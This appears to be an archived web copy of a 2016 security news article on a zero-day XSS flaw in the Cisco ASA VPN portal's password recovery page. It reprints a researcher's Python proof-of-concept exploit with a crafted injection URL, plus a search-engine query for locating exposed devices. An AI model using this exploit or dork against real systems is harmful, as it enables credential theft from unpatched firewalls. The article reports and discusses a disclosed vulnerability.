<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Zero Day XSS Vulnerability Stops Cisco ASA Users Credentials</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In early February 2016, information about the critical vulnerability of Cisco ASA firewalls that allows attackers to perform remote code execution got...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Zero Day XSS Vulnerability Stops Cisco ASA Users Credentials</h1><div class="post__text post__text-html js-mediator-article"> <a href="https://habrahabr.ru/company/pt/blog/277575/"><img src="https://habrastorage.org/files/d1f/bc8/20a/d1fbc820aac34c8a82fcd48994c8affe.jpg"></a> <br><br>  In early February 2016, information about the <a href="https://habrahabr.ru/company/pt/blog/277139/">critical vulnerability of</a> Cisco ASA firewalls that allows attackers to perform remote code execution got into the network.  A few days after it was fixed, another serious security error was discovered in this product. <br><br>  On February 17, researcher Juan Sacco <a href="http://seclists.org/fulldisclosure/2016/Feb/82%3Futm_source%3Dfeedburner%26utm_medium%3Dtwitter%26utm_campaign%3DFeed%253A%2Bseclists%252FFullDisclosure%2B%2528Full%2BDisclosure%2529">published</a> information about the zero-day vulnerability, through which, under certain circumstances, an attacker could steal the device‚Äôs user credentials. <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The XSS vulnerability is contained in the password recovery page of the Cisco ASA VPN portal.  Theft of user credentials is possible because of the incorrect operation of the filtering of input fields in the form of password recovery (more information about vulnerabilities of this type <a href="https://habrahabr.ru/post/66057/">has already been written</a> on Habr√©). <br><br>  To successfully exploit the vulnerability in <a href="http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html">hidden input fields</a> , the Cisco ASA user must use the FireFox browser to follow the link to the VPN portal‚Äôs password recovery page that was specially generated by the attacker (Chrome cannot exploit the error) and use the Alt + Shift + X shortcut on it . <br><br>  Juan Sacco published a PoC-exploit to demonstrate the exploitation of this vulnerability: <br><br><pre><code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> string, sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket, httplib <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> telnetlib def run(): <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: Target = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] Port = int(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>]) # Here goes your custom JS agent code Payload = <span class="hljs-string"><span class="hljs-string">"alert(1)"</span></span> VulnerableURL =<span class="hljs-string"><span class="hljs-string">"/+CSCOE+/logon.html?reason=2&amp;a0=63&amp;a1=&amp;a2=&amp;a3=0&amp;next=&amp;auth_handle=&amp;status=0&amp;username=juansacco%22%20accesskey%3dX%20onclick%3d"</span></span>+ Payload + <span class="hljs-string"><span class="hljs-string">"%20sacco&amp;password_min=0&amp;state=&amp;tgroup=&amp;serverType=0&amp;password_"</span></span> CraftedRequest = VulnerableURL # Start the connection connection = httplib.HTTPSConnection(Target) connection.request(<span class="hljs-string"><span class="hljs-string">'GET'</span></span>, CraftedRequest) Response = connection.getresponse() print <span class="hljs-string"><span class="hljs-string">"Server status response:"</span></span>, Response.status, Response.reason data = Response.read() vulnerable = <span class="hljs-string"><span class="hljs-string">"Target is not vulnerable"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> line <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> str(data).splitlines(): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">"juansacco\\\""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> line: vulnerable = <span class="hljs-string"><span class="hljs-string">"Targer is vulnerable"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> vulnerable != <span class="hljs-string"><span class="hljs-string">"Not vulnerable"</span></span>: print <span class="hljs-string"><span class="hljs-string">"Result of the test:"</span></span>, vulnerable # Find the injection on the response connection.close() except Exception,<span class="hljs-attr"><span class="hljs-attr">e</span></span>: print <span class="hljs-string"><span class="hljs-string">"Exploit connection closed "</span></span> + str(e) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: print <span class="hljs-string"><span class="hljs-string">"Cisco VPN ASA Exploit - Zero Day"</span></span> print <span class="hljs-string"><span class="hljs-string">"################################"</span></span> print <span class="hljs-string"><span class="hljs-string">"Author: Juan Sacco - jsacco@exploitpack.com"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: Target = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] Port = sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>] except IndexError: pass</code> </pre> <br>  As it turned out, the code presented later contained typos in the code, and the URL lacked a space.  After correcting these shortcomings, it becomes possible to exploit the vulnerability: <br><br><img src="https://habrastorage.org/files/657/0f8/2f4/6570f82f402144f5be1d78882d08489a.jpg"><br><br><img src="https://habrastorage.org/files/79b/c9f/1be/79bc9f1bedda4dc9a1e58e7999145fa5.jpg"><br><br>  In the comments to the exploit, Sacco notes that he transmitted information about the vulnerability to Cisco representatives on February 4, 2016, after the publication of the corresponding CVE, on the 16th the researcher distributed information about the error along with the exploit. <br><br>  In addition, Sacco leads a link to search for vulnerable Cisco ASA devices using Google - <code><a href="https://www.google.nl/"></a> www.google.nl/#safe=off&amp;q=+%2F%2BCSCOE%2B%2F</code>  <code><a href="https://www.google.nl/"></a> www.google.nl/#safe=off&amp;q=+%2F%2BCSCOE%2B%2F</code> .  According to him, the search engine provides more than 18 thousand links for this request (at the moment - more than 24 thousand). <br><br>  You can also find vulnerable devices using the search engines Shodan and Censys.  With the help of their specialists, Positive Technologies managed to detect more than 170 thousand vulnerable Cisco ASA devices, more than three thousand of which are located in Russia. <br><br><img src="https://habrastorage.org/files/e3d/281/111/e3d2811115dd4cd7bd7cedab7d35f93b.jpg"><br><br><img src="https://habrastorage.org/files/fdc/7c1/78f/fdc7c178f8f64605be18a7445c9b9a83.jpg"><br><br>  To detect the vulnerability described by Juan Sacco, experts from Positive Technologies recommend using specialized protection tools - for example, the monitoring system of security and compliance with <a href="http://www.ptsecurity.ru/products/mp8/">MaxPatrol 8</a> standards. <br><br>  Recently, security researchers have found vulnerabilities in more than just Cisco products.  For example, at the end of December 2015, information about a <a href="http://www.wired.com/2015/12/juniper-networks-hidden-backdoors-show-the-risk-of-government-backdoors/">backdoor</a> in Juniper firewalls got into the press.  In addition, Fortinet, a manufacturer of security tools, was in the center of the scandal - security products for remote access were found in its products. </div><p>Source: <a href="https://habr.com/ru/post/277575/">https://habr.com/ru/post/277575/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../277565/index.html">Framer Animation for Beginners</a></li>
<li><a href="../277567/index.html">Windows 10 application with data in the cloud using Azure Mobile Apps</a></li>
<li><a href="../277569/index.html">Battle for sound speed on Android x86</a></li>
<li><a href="../277571/index.html">Security Week 07: Apple vs. FBI, global glibc vulnerability, crypto-fiber and medicine</a></li>
<li><a href="../277573/index.html">Kotlin 1.0. Ask the team a question</a></li>
<li><a href="../277577/index.html">Memo on the basic layout of the article for Habr without using Markdown-markup</a></li>
<li><a href="../277579/index.html">Game Industry Digest: January</a></li>
<li><a href="../277581/index.html">Game development digest</a></li>
<li><a href="../277583/index.html">Parallel execution of tests based on context using Visual Studio 2015 Update 1</a></li>
<li><a href="../277585/index.html">Console management of the DLNA server Mediatomb</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>